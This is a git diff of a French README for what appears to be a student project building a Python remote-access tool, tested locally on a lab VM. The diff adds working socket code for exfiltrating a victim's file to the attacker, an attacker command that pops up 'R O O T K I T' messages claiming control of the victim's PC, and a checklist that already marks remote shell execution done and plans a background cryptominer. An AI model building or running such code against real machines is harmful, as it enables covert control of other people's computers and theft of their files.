@@ -59,10 +59,10 @@ Ce projet se déroule entièrement en **local**.
 
 # Avancement du projet
 
-
 - [x] Création du shell côté attaquant
 - [x] Mise en place de l'exfiltration de fichiers de la victime
 - [x] Mise en place de l'exécution du shell de la victime depuis l'attaquant
+- [x] Mise en place d'une commande custom qui lance une POP-UP sur le client
 - [ ] Amélioration de l'interface shell côté attaquant pour proposer une solution interactive 
 - [ ] Mineur de cryptomonnaies en fond
 
@@ -102,7 +102,7 @@ La première fonction **verification** permet de définir les commandes côté a
 
 ```python
 def verifications(SHELL_PYTHON):
-    verifications = ["shell", "exit", "recv_archive", "help"]
+    verifications = ["shell", "exit", "recv_archive", "help","popup"]
     #Shell : Pour avoir accès à la shell de la victime
     if(SHELL_PYTHON == verifications[0]):
         print("Exécution du shell côté client")
@@ -110,7 +110,7 @@ def verifications(SHELL_PYTHON):
             shell = Shell.command()
             if shell == "exit":
                 break  
-    #Exit : Pour quitter coté victime 
+    #Exit : Pour arrêter le malware coté victime 
     if(SHELL_PYTHON == verifications[1]):
         print("Connexion fermée côté client")
         conn.send("exit".encode())
@@ -129,6 +129,10 @@ def verifications(SHELL_PYTHON):
     #Help : lister les commandes possibles
     if(SHELL_PYTHON == verifications[3]):
         print("help")
+    #Popupclient : Affiche une popup sur l'ordinateur cible
+    if(SHELL_PYTHON == verifications[4]):
+        conn.send("popup".encode())
+        print("Popup envoyée au client")
 ```
 
 La seconde fonction **home** permet envoie l'instruction 'home' à la victime qui l'interprète avec une fonction dans son code, renverra en réponse le chemin du répertoire actuel via le socket conn.
@@ -170,7 +174,19 @@ def command():
 La quatrième fonction **recv_archive** permet l'exfiltration de données :
 
 ```python
-&&&
+#Recv Archive Serveur
+def recv_archive(data):
+    #Exfiltration du fichier
+    f = open (r"C:\Users\ADM_VM01\Desktop\TP2\FichierExfiltré.txt", 'wb')
+    conn.send("rcv".encode())
+    s.listen(1)
+    #Téléchargement de ce dernier
+    data = conn.recv(1024)
+    f.write(data)
+    f.close()
+    print("Téléchargement terminé")
+    conn.shutdown(2)
+    conn.close()
 ```
 
 ### Traitement de la partie serveur
@@ -252,10 +268,34 @@ def verifications(DATA):
 La première fonction **send_archive** permet d'envoyer les fichiers spécifiés par l'attaquant.
 
 ```python
-&&&
+    #Recv Archive Client
+def send_archive(DATA):
+    file = r"C:\Users\ADM_VM01\Documents\test.txt"
+    filetosend = open(file, "rb")
+    #Envoi des données
+    data = filetosend.read(1024)
+    print("Sending...")
+    print(data)
+    s.send(data)
+    filetosend.close()
+    s.send(b"DONE")
+    print("Done Sending.")
+    print(s.recv(1024))
+    s.shutdown(2)
+    s.close()
 ```
 
-La troisième fonction **command** permet de traiter l'ordre envoyé par l'attaquant. DATA est renvoyé à l'attaquant.
+La troisième fonction **popupclient** permet l'affichage d'une popup côté client, l'action déclanché par l'attaquant. L'affichage se réalise 5 fois.
+
+```python
+    #Popupclient client
+def popupclient(DATA):
+    for i in range (5):
+        messagebox.showerror("R O O T K I T", "J'ai le contrôle de votre PC")
+```
+
+
+La quatrième fonction **command** permet de traiter l'ordre envoyé par l'attaquant. DATA est renvoyé à l'attaquant.
 
 ```python
 def command(DATA):
